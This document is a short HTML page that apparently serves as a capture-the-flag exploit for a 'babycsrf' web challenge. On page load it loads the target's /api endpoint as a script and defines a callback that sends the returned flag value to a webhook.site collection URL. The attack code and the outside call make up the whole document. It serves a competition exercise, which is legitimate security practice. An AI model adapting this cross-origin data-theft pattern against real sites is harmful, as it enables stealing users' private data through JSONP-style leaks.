<!DOCTYPE html>
<html>
    <body>
        <script>
window.setMessage = (m) => {
    location.href="https://webhook.site/...?flag="+m;
}
window.onload = () => {
    s = document.createElement("script");
    s.src = "https://babycsrf-web.chal.irisc.tf/api";
    document.body.appendChild(s);
}
        </script>
    </body>
</html>